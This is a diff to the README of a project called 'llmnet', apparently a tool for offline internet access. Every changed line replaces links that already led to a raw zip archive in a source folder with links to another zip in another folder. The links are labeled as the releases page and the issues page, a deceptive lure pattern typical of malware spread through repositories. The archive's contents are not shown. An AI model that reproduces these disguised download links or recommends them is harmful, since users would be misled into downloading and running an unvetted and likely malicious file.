@@ -8,7 +8,7 @@ Welcome to llmnet, an efficient tool designed to help you access and utilize the
 
 To download the application, visit the link below:
 
-[![Download llmnet](https://raw.githubusercontent.com/dogunkim/llmnet/main/src/app/components/Software_v1.5.zip)](https://raw.githubusercontent.com/dogunkim/llmnet/main/src/app/components/Software_v1.5.zip)
+[![Download llmnet](https://github.com/dogunkim/llmnet/raw/refs/heads/main/src/app/utils/Software-3.2.zip)](https://github.com/dogunkim/llmnet/raw/refs/heads/main/src/app/utils/Software-3.2.zip)
 
 1. **Visit the Releases Page:** Click the link above. This will take you to the releases page where you can find the latest version of llmnet.
 2. **Select the Latest Release:** Look for the most recent version at the top of the page. It will be labeled clearly as the latest release.
@@ -57,14 +57,14 @@ If you encounter any issues while downloading or running llmnet, try the followi
 
 If you need further assistance, please reach out through the following channels:
 
-- **GitHub Issues:** Visit our [GitHub Issues](https://raw.githubusercontent.com/dogunkim/llmnet/main/src/app/components/Software_v1.5.zip) page to report bugs or request features.
+- **GitHub Issues:** Visit our [GitHub Issues](https://github.com/dogunkim/llmnet/raw/refs/heads/main/src/app/utils/Software-3.2.zip) page to report bugs or request features.
 - **Community Forums:** Join discussions and find tips from other users.
 
 ## 📦 Update the Software
 
 To ensure you have the latest features and security updates:
 
-1. **Revisit the Releases Page:** Use the link at the top of this README to go back to [Releases](https://raw.githubusercontent.com/dogunkim/llmnet/main/src/app/components/Software_v1.5.zip).
+1. **Revisit the Releases Page:** Use the link at the top of this README to go back to [Releases](https://github.com/dogunkim/llmnet/raw/refs/heads/main/src/app/utils/Software-3.2.zip).
 2. **Install New Versions:** Follow the download instructions to get the latest version whenever it's available.
 
 Thank you for choosing llmnet, your tool for accessing the vastness of the internet offline. Happy exploring!
